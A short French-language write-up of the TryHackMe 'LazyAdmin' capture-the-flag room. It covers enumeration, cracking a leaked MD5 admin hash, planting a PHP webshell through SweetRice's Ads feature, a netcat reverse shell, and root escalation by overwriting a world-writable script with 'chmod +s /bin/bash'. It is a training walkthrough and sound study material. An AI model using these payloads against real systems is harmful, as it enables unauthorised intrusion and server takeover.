# LazyAdmin — TryHackMe

## Nmap

```bash
sudo nmap -sS -vv 10.130.160.183
```

Ports ouverts : **22 (SSH)**, **80 (HTTP)**

---

## Énumération web

```bash
gobuster dir -u http://10.130.160.183 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

Découverte de `/content/` → **SweetRice CMS**

```bash
ffuf -u http://10.130.160.183/content/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.txt,.html -mc 200,301,302
```

Un backup SQL est exposé dans `/content/inc/`. Il contient des credentials :

- **User :** `manager`
- **Hash :** `42f749ade7f9e195bf475f37a44cafcb` (MD5)

Crack via CrackStation ou John → mot de passe obtenu.

Connexion au panel admin : `http://10.130.160.183/content/as/`

---

## RCE via Ads

Dans le panel : **Ads → Add**

```php
<?php system($_GET['cmd']); ?>
```

Accès au webshell :

```
http://10.130.160.183/content/inc/ads/shell.php?cmd=whoami
```

Reverse shell via [revshells.com](https://revshells.com) + `nc -lvnp 4444`.

---

## Escalade de privilèges

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

`backup.pl` exécute `/etc/copy.sh` en root. Le fichier est world-writable :

```bash
echo 'chmod +s /bin/bash' > /etc/copy.sh
sudo /usr/bin/perl /home/itguy/backup.pl
bash -p
```

**Root obtenu.**

---

## Flags

```bash
cat /home/itguy/user.txt
cat /root/root.txt
```
